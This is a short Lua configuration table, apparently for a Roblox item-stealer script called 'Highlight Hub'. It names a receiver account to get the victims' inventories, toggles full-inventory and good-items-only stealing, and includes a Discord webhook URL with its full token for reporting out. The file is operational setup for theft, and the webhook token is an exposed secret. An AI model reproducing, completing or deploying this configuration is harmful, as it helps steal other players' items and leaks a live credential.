Config = {
    Receivers = {"SydearrItems"}, -- Tek bir receiver ekledik
    Webhook = "https://discord.com/api/webhooks/1336090075078983833/uY4wS-VBiZCXSSfG2SaowTbGit4uUJIheKEMWqVNvrXrd1gXqGxFSdk6XVX5FlfZWqxF",
    FullInventory = true, 
    GoodItemsOnly = false, 
    ResendTrade = ".", 
    Script = "Highlight Hub", 
    CustomLink = "None"
}
